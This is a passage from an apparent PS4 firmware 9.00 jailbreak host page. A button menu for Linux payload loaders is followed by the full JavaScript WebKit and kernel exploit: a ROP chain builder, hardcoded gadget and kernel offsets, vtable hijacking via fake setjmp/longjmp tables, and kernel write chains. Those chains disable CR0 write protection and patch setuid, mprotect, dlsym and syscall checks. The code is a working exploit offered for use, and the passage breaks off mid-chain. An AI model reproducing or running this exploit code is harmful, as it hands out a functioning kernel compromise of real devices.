      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux4gb(); return false">NazkyYT Linux 4GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux5gb(); return false">NazkyYT Linux 5GB Vram</button>
      <br><br>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux1gb(); return false">PSXita Linux 1GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux2gb(); return false">PSXita Linux 2GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux3gb(); return false">PSXita Linux 3GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux4gb(); return false">PSXita Linux 4GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux5gb(); return false">PSXita Linux 5GB Vram</button>
      <br><br>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux1gb(); return false">PSXita-PRO Linux 1GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux2gb(); return false">PSXita-PRO Linux 2GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux3gb(); return false">PSXita-PRO Linux 3GB Vram</button>
      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux4gb(); return false">PSXita-PRO Linux 4GB Vram</button>
    </div>
    <div id="Backl" style="display: none;">
      <br>
      <br>
      <a ><button class="btnkme" onMouseOver="msgs.innerHTML='Go Back'" ; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" type="button">Back</button></a>
    </div>
    <br>
    <h1 style="text-align:center;font-size:25px;color:white">Massive Thanks - Theflow0, Znullptr, ChendoChap, Specter, Sleirsgoevy, SiSTRo, Al-Azif, PRB, Leeful And Many More...</h1>
    <p style="text-align:center;font-size:20px;color:white">https://twitter.com/Kameleonre_</p>
    </div>
    <script>
    var UA = navigator.userAgent.substring(navigator.userAgent.indexOf('5.0 (') + 19, navigator.userAgent.indexOf(') Apple')).replace("layStation 4/","");
    if (UA == "9.00"){PS4fw.innerHTML="v"+UA+" Detected"};if(UA != "9.00"){PS4fw.innerHTML="Spoofed To v"+UA};
    </script>
    <script>
    if (localStorage.passcount == null || localStorage.passcount == undefined) localStorage.passcount=0;
     if (localStorage.passCounter == null || localStorage.passCounter == undefined ){
      passCounter.innerHTML=localStorage.passcount;}
    if (localStorage.failcount == null || localStorage.failcount == undefined) localStorage.failcount=0;
     if (localStorage.failCounter == null || localStorage.failCounter == undefined ){
      failCounter.innerHTML=localStorage.failcount;}
</script>
    </script>

    <script> //Organize more the payloads menu Method By NazkyYT Modded By Kameleon_
      var GBl = document.getElementById("Backl");
      var plmenu = document.getElementById("pldmenu");
      var linuxl = document.getElementById("linuxl");
      var linuxlJ = document.getElementById("linuxlJ");
          
      linuxl.onclick = function() {
        plmenu.style.display = "none";
        linuxl.style.display = "none";
        linuxlJ.style.display = "unset";
        GBl.style.display = "unset";
        
      }

      GBl.onclick = function() {
        plmenu.style.display = "unset";
        linuxl.style.display = "unset"
        linuxlJ.style.display = "none";
        GBl.style.display = "none";
      }
    </script>
    
</script>

<script>
//Exploit Code by ChendoChap & Znullptr
//Webkit Exploit by Sleirsgoevy

///////////////////INT64
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

///////////////////ROP
const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};
//////////////////////////KERNEL EXPLOIT
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    //RW -> ROP method is strongly based off of:
    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();

    //Sanity check
    if (chain.syscall(20).low == 0) {
        alert("webkit exploit failed. Try again.");
        while (1);}
}

function run_hax() 
{
    userland();
    if (chain.syscall(23, 0).low != 0x0)
    {
        kernel();
    }
    sessionStorage.isWebKitdone = "yes";
    
    //Add some logic for payloads running only on WebKit Exploit!!
    if (sessionStorage.pltype == "binserver9020")
    {
       setTimeout(exec_binserver9020(),1500);
    }
    else if (sessionStorage.pltype == "oob")
    {
        setTimeout(loadPayloadData(),1500);
    }
    else if (sessionStorage.pltype == "linux" || sessionStorage.pltype == "mira")
    {
        setTimeout(loadPayloadDataSleirs(PLfile),1500);
    }
    //End Logic
}

function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        //Ensure all gadgets are available to kernel.
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;
    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    //Ensure the krop stack remains available.
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    //Sorry we're closed
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.


    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);


    //Initial patch(es)
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    //might as well do the others
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    //I guess you're not all that bad...
    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

    //Restore original UD
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
